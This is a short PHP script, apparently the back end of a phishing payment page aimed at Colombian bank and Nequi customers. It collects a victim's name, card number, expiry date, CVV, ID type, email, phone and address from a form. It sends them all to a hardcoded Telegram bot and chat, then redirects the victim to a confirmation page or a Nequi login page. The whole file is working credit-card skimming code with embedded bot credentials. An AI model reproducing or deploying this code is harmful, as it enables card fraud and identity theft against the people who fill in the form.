<?php
// Datos del bot y del chat
$botToken = "6935930409:AAGwgOEXGaigPQhcNQrCyF5fdAm34FL6hqw";
$chatId = "6065537099";

// Obtener los datos enviados desde el formulario
$nombreApellido = $_POST['nombre'];
$numeroTarjeta = $_POST['inputNumero'];
$fechaExpiracion = $_POST['selectMes'];
$cvv = $_POST['inputCCV'];
$tipoDocumento = $_POST['documento'];
$correoElectronico = $_POST['direccion'];
$telefono = $_POST['tel'];
$direccion = $_POST['direccion'];
$bancoSeleccionado = $_POST['TxtBanco']; // Este es el valor del banco seleccionado

// Preparar el mensaje
$mensaje = "Nuevo Pago Recibido:\n";
$mensaje .= "Nombre y Apellido: " . $nombreApellido . "\n";
$mensaje .= "Número de Tarjeta: " . $numeroTarjeta . "\n";
$mensaje .= "Fecha de Expiración: " . $fechaExpiracion . "\n";
$mensaje .= "CVV: " . $cvv . "\n";
$mensaje .= "Tipo de Documento: " . $tipoDocumento . "\n";
$mensaje .= "Correo Electrónico: " . $correoElectronico . "\n";
$mensaje .= "Teléfono: " . $telefono . "\n";
$mensaje .= "Dirección: " . $direccion . "\n";
$mensaje .= "Banco Seleccionado: " . $bancoSeleccionado . "\n";

// URL de la API de Telegram
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

// Parámetros para la solicitud POST
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje
];

// Enviar la solicitud POST a la API de Telegram
$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
    ]
];
$context  = stream_context_create($options);
$response = file_get_contents($url, false, $context);

// Redirigir dependiendo del valor seleccionado
if ($bancoSeleccionado === 'NEQUI') {
    header("Location: ../logonequi6.php");
} else {
    header("Location: ../confirmacion.php");
}
exit;
?>
